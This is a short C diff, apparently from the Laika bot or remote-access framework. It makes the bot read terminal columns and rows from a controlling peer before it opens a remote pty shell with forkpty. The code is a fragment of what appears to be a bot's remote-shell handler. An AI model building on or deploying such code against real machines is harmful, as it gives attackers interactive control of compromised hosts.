@@ -10,10 +10,13 @@
 #include "bot.h"
 #include "shell.h"
 
-struct sLaika_shell *laikaB_newShell(struct sLaika_bot *bot) {
+struct sLaika_shell *laikaB_newShell(struct sLaika_bot *bot, int cols, int rows) {
+    struct winsize ws;
     struct sLaika_shell *shell = (struct sLaika_shell*)laikaM_malloc(sizeof(struct sLaika_shell));
 
-    shell->pid = forkpty(&shell->fd, NULL, NULL, NULL);
+    ws.ws_col = cols;
+    ws.ws_row = rows;
+    shell->pid = forkpty(&shell->fd, NULL, NULL, &ws);
 
     if (shell->pid == 0) {
         /* child process, clone & run shell */
@@ -104,13 +107,17 @@ bool laikaB_writeShell(struct sLaika_bot *bot, struct sLaika_shell *shell, char 
 
 void laikaB_handleShellOpen(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
     struct sLaika_bot *bot = (struct sLaika_bot*)uData;
+    uint16_t cols, rows;
 
     /* check if shell is already open */
     if (bot->shell)
         LAIKA_ERROR("LAIKAPKT_SHELL_OPEN requested on already open shell!\n");
 
+    laikaS_readInt(&peer->sock, &cols, sizeof(uint16_t));
+    laikaS_readInt(&peer->sock, &rows, sizeof(uint16_t));
+
     /* open shell */
-    laikaB_newShell(bot);
+    laikaB_newShell(bot, cols, rows);
 }
 
 void laikaB_handleShellClose(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
